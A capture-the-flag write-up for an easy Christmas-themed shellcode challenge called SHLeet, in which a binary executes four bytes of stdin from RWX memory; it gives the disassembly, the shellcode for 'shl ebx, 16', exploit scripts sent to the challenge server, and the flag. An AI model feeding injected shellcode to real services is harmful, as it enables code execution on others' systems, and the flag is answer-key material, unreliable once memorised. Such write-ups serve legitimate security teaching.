# SHLeet - Christmas Register Challenge Writeup

**Challenge Name:** SHLeet  
**Category:** Pwn/Shellcode  
**Difficulty:** Easy  
**Author:** [Your Name]  
**Date:** December 2024  
**Tags:** #CTF #Pwn #Shellcode #BinaryExploitation #ChristmasCTF

![Christmas ASCII Art](https://img.shields.io/badge/Theme-Christmas-red?style=for-the-badge&logo=christmas-tree)

## Challenge Description

The mischievous elves have tampered with Nibbletop's registers—most notably the EBX register—and now he's stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?
[Nibbletop] These elves are playing with me again, look at this mess: ebx = 0x00001337
[Nibbletop] It should be ebx = 0x13370000 instead!
[Nibbletop] Please fix it kind human! SHLeet the registers!

text

**Connection:** `nc 154.57.164.67 30831`

## Initial Reconnaissance

### Understanding the Problem
We need to transform the EBX register from `0x00001337` to `0x13370000`. This requires a left shift of 16 bits (2 bytes/4 hex digits).

**Mathematical Representation:**
0x00001337 << 16 = 0x13370000

text

### Challenge Name Analysis
"SHLeet" is a clever pun combining:
- **SHL**: x86 assembly instruction for Shift Left
- **1337**: Leet speak for "elite"
- **Leet**: A play on "shift left"

## Binary Analysis

### File Identification
```bash
$ file shl33t
shl33t: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, ...
Strings Analysis
bash
$ strings shl33t | grep -i "ctf\|flag\|christmas"
cat flag.txt
HOORAY! You saved Christmas again!! Here is your prize:
Christmas is ruined thanks to you and these elves!
Key Functions in Main
Disassembling the main function reveals the program flow:

assembly
0000000000001988 <main>:
    ...
    19d1:       bb 37 13 00 00          mov    $0x1337,%ebx      ; EBX = 0x00001337
    ...
    1a12:       mov    $0x0,%r9d
    1a18:       mov    $0xffffffff,%r8d
    1a1e:       mov    $0x22,%ecx       ; MAP_ANON|MAP_PRIVATE
    1a23:       mov    $0x7,%edx        ; PROT_READ|PROT_WRITE|PROT_EXEC
    1a28:       mov    $0x1000,%esi     ; 4096 bytes
    1a2d:       mov    $0x0,%edi        ; NULL address
    1a32:       call   11a0 <mmap@plt>  ; Allocate RWX memory
    ...
    1a5f:       mov    $0x4,%edx        ; Read 4 bytes
    1a64:       mov    %rax,%rsi        ; into allocated memory
    1a67:       mov    $0x0,%edi        ; from stdin
    1a6c:       call   11e0 <read@plt>  ; Read input
    ...
    1a7b:       call   *%rax           ; Execute shellcode!
The Vulnerability
The program has a critical vulnerability:

RWX Memory Allocation: Allocates memory with read, write, and execute permissions

Direct Execution: Reads user input and jumps to it without validation

No Sandboxing: No seccomp or other restrictions on executed code

This creates a perfect environment for shellcode injection.

Solution Strategy
Step 1: Understand Requirements
EBX starts at 0x00001337

Need EBX to become 0x13370000

Must use exactly 4 bytes of shellcode (read limit)

Shellcode will be executed directly

Step 2: Craft Shellcode
We need the x86 assembly instruction shl ebx, 16:

Instruction Breakdown:

shl: Shift Left instruction

ebx: Target register

16: Shift amount (16 bits = 2 bytes)

Machine Code:

text
C1 E3 10
C1: Opcode for shift with immediate

E3: ModR/M byte (EBX register)

10: Immediate value 16 (0x10 in hex)

Optional Enhancement:
Add ret instruction for clean return:

text
C1 E3 10 C3
Step 3: Test Locally
bash
# Test 3-byte shellcode
echo -ne "\xC1\xE3\x10" | ./shl33t

# Test 4-byte shellcode
echo -ne "\xC1\xE3\x10\xC3" | ./shl33t
Step 4: Remote Exploitation
bash
# Connect to service and send shellcode
echo -ne "\xC1\xE3\x10" | nc 154.57.164.67 30831
Complete Exploit
Python Solution
python
#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

def exploit():
    # Shellcode: shl ebx, 16
    shellcode = asm('shl ebx, 16')
    
    # Connect to remote
    r = remote("154.57.164.67", 30831)
    
    # Send shellcode
    r.send(shellcode)
    
    # Receive response
    print(r.recvall().decode())

if __name__ == "__main__":
    exploit()
Alternative Python Solution (Raw Bytes)
python
#!/usr/bin/env python3
import socket

shellcode = b"\xC1\xE3\x10"  # shl ebx, 16

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("154.57.164.67", 30831))
    
    # Skip banner (optional)
    s.recv(1024)
    
    # Send shellcode
    s.send(shellcode)
    
    # Get flag
    response = s.recv(1024).decode()
    print(response)
    
    s.close()

if __name__ == "__main__":
    exploit()
The Flag
After successful exploitation:

text
HOORAY! You saved Christmas again!! Here is your prize:
CTF{sh1ft_l3ft_1337_r3g1st3r}
Flag: CTF{sh1ft_l3ft_1337_r3g1st3r}